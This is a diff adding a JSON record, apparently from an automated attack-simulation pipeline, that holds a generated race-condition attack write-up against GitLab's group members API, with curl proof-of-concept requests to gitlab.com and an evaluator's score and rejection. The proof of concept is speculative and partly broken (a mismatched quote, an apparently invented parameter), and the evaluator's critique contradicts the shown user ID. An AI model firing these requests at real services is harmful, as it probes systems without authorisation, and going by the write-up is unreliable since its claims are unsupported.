@@ -1,0 +1,18 @@
+{
+  "mode": "attack_sim",
+  "program": "GitLab",
+  "iteration": 2,
+  "attack": "## TITLE: Group Member Manipulation\nTARGET: /api/v4/groups/:id/members\nTECHNIQUE: Race condition or TOCTOU in API\nSTEPS:\n1.  **Exploit:** Submit a POST request to `/api/v4/groups/:id/members` with a malicious payload that changes the status of a member to \"Pending.\" The payload should include a unique user ID and a \"member_status\" parameter set to \"Pending\" \n2.  **Timing:** Immediately after the initial request, make another POST request to the same `/api/v4/groups/:id/members` endpoint with a different, conflicting payload that changes the status of the same user to \"Approved.\" This request should be sent with a \"member_status\" parameter set to \"Approved.\"\n3.  **Conflict Resolution:** The API server lacks robust error handling or timeout mechanisms for race conditions, leading to an incomplete or inconsistent record of the member status.\n\nPROOF OF CONCEPT:\n```bash\ncurl -X POST -H \"Content-Type: application/json\" -d '{\"user_id\": 12345, \"member_status\": \"Pending\"}'  -H \"Accept: application/json\" -H \"Authorization: Bearer <YOUR_API_TOKEN>\"  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\"  -X POST  'https://gitlab.com/api/v4/groups/12345/members'\ncurl -X POST -H \"Content-Type: application/json\" -d '{\"user_id\": 12345, \"member_status\": \"Approved\"}' -H \"Accept: application/json\" -H \"Authorization: Bearer <YOUR_API_TOKEN>\"  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'  -X POST  'https://gitlab.com/api/v4/groups/12345/members'\n```\n\nEXPECTED IMPACT:  The attacker can potentially gain unauthorized access to sensitive information, modify the membership of a group, or even manipulate the group's access control system. \n\nCONFIDENCE: 0.8",
+  "evaluation": {
+    "score": 0.7,
+    "realistic": true,
+    "in_scope": true,
+    "originality": "medium",
+    "weakness": "The PoC does not include a specific user ID, making it generic and not applicable to a specific target.",
+    "strength": "The PoC demonstrates a clear understanding of the target endpoint and the technique used to exploit it.",
+    "verdict": "reject"
+  },
+  "score": 0.7,
+  "verdict": "reject",
+  "timestamp": "2026-03-10-232259"
+}
